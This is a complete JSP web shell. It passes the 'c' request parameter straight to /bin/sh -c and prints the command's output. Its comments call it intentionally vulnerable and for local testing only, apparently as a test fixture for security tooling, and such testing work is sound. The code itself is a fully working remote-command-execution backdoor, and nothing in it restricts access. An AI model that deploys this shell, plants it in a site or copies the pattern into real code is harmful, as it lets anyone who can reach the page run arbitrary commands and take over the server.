<%@ page trimDirectiveWhitespaces="true" %><%
// Intentionally vulnerable JSP command webshell — LOCAL TESTING ONLY.
// Java/JSP has no eval(), so this is a *command* shell: param `c` is an OS
// shell command whose combined output is returned. (Bind to localhost only.)
String c = request.getParameter("c");
if (c != null && c.length() > 0) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", c});
    java.io.InputStream is = p.getInputStream();
    java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
    byte[] buf = new byte[4096];
    int n;
    while ((n = is.read(buf)) != -1) { bos.write(buf, 0, n); }
    out.print(bos.toString("UTF-8"));
}
%>
